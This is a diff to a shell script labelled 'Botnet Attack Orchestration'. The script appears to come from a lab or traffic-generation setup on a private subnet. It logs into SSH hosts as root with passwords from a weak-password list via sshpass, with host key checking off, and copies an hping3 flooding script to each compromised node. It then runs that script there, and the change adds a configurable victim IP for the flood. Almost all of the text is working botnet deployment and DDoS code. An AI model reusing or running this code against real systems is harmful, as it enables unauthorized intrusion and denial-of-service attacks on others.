@@ -8,6 +8,7 @@
 TARGET_NETWORK="${TARGET_NETWORK:-192.168.200.0/24}"
 SSH_USER="${SSH_USER:-root}"
 PASSWORD_LIST="${PASSWORD_LIST:-/app/ssh_weak_passwords.txt}"
+ATTACK_TARGET_IP="${ATTACK_TARGET_IP:-}"
 
 echo "[*] ============================================"
 echo "[*] Botnet Attack Orchestration"
@@ -58,10 +59,16 @@ for target in $SSH_TARGETS; do
     echo "[*] Deploying hping3 attack script to $target..."
     
     # Copy attack script
-    scp -o StrictHostKeyChecking=no /app/hping3_attack.sh root@$target:/tmp/hping3_attack.sh 2>&1 | tee -a /app/results/deployment.log
+    sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no /app/hping3_attack.sh root@$target:/tmp/hping3_attack.sh 2>&1 | tee -a /app/results/deployment.log
     
-    # Execute attack on compromised node (in background)
-    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$target "chmod +x /tmp/hping3_attack.sh && bash /tmp/hping3_attack.sh &" 2>&1 | tee -a /app/results/deployment.log
+    # Execute attack on compromised node (in background), passing the target IP
+    if [ -n "$ATTACK_TARGET_IP" ]; then
+        sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$target "chmod +x /tmp/hping3_attack.sh && bash /tmp/hping3_attack.sh $ATTACK_TARGET_IP" 2>&1 | tee -a /app/results/deployment.log
+        echo "[+] hping3 attack launched from $target targeting $ATTACK_TARGET_IP"
+    else
+        sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$target "chmod +x /tmp/hping3_attack.sh && bash /tmp/hping3_attack.sh" 2>&1 | tee -a /app/results/deployment.log
+        echo "[!] WARNING: No ATTACK_TARGET_IP set, hping3 attack may fail"
+    fi
     
     echo "[+] hping3 attack launched from $target"
     echo "[+] Attack will run from T+60s to T+120s"
